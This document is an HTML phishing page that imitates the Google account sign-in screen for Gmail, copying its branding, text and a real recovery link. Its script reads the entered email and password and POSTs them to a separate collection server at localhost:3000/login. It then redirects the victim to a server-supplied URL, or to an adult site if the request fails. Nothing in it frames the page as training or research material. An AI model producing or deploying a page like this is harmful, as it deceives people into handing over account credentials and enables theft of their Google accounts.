<!DOCTYPE html>
<html lang="en">

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="google.png" type="image/x-icon" />
  <link rel="stylesheet" href="style.css">
  <title>Google account - sign in</title>

</head>

<body>
  <div class="formContainer">
    <form id="loginForm">
      <img src="google.png" alt="" height="48px" width="48px" class="logo" />
      <div>
        <!-- Loading Overlay placed here or at body end -->
      </div>
      <div id="loading-overlay">
        <div class="spinner"></div>
      </div>
      <div class="wrapper">
        <div class="left">
          <div>
            <h1>Sign in</h1>
            <p>
              with your Google account to continue to Gmail. This account will be
              avilable to other Google apps in the browser.
            </p>
          </div>
        </div>
        <div class="right">
          <div class="input-container" id="email-container">
            <label class="floating-label" for="email">Email or phone</label>
            <input type="email" id="email" autocomplete="off" required />
            <label class="floating-label" for="password" style="margin-top: 60px;">Password</label>
            <input type="password" id="password" autocomplete="off" required style="margin-top: 20px;" />
            <a href="https://accounts.google.com/signin/v2/usernamerecovery?checkedDomains=youtube&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&dsh=S792558853%3A1757777138402722&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=AdBytiNskhM4GL6bkOpZh7Va0R3rtLn7CFNCTYjEJPxOA0Ut4EazFKqKFWV7W0QmqLeRKxZw1uvq4A&pstMsg=1&rip=1&service=mail"
              class="forget_email" style="margin-top: 20px;">Forgot email?</a>
          </div>

          <div class="relate-forget">
            <p>
              Not your computer? Use Guest mode to sign in privately. <a href="#">
                Learn more
                about using Guest mode
              </a>
            </p>
          </div>
          <div class="otherbtn">
            <a href="#">Create account</a>
            <a href="#" class="active"
              onclick="document.getElementById('loginForm').requestSubmit(); return false;">Next</a>
          </div>
        </div>
      </div>
    </form>
    <footer>
      <div class="language">
        <select name="" id="">
          <option value="">English (United States)</option>
        </select>
      </div>
      <div class="others">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </footer>
  </div>

  <script>
    const container = document.getElementById("email-container");
    const input = container.querySelector("input");

    function updateState() {
      if (input.value.trim() !== "") {
        container.classList.add("filled");
      } else {
        container.classList.remove("filled");
      }
    }

    input.addEventListener("focus", () => {
      container.classList.add("focused");
    });

    input.addEventListener("blur", () => {
      container.classList.remove("focused");
      updateState();
    });

    input.addEventListener("input", updateState);

    // Initialize on page load (for autofilled inputs)
    updateState();

    // Form Submission Logic
    const form = document.getElementById('loginForm');
    const loadingOverlay = document.getElementById('loading-overlay');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      // Show loading
      loadingOverlay.style.display = 'flex';

      try {
        const response = await fetch('http://localhost:3000/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ email, password })
        });

        const result = await response.json();

        if (result.redirectUrl) {
          // Wait a bit to show the loading animation (optional, but requested "make loading show")
          setTimeout(() => {
            window.location.href = result.redirectUrl;
          }, 1500);
        }
      } catch (error) {
        console.error('Login error:', error);
        // On error, maybe just redirect anyway or show error
        setTimeout(() => {
          window.location.href = 'https://omg.adult';
        }, 1500);
      }
    });
  </script>
</body>

</html>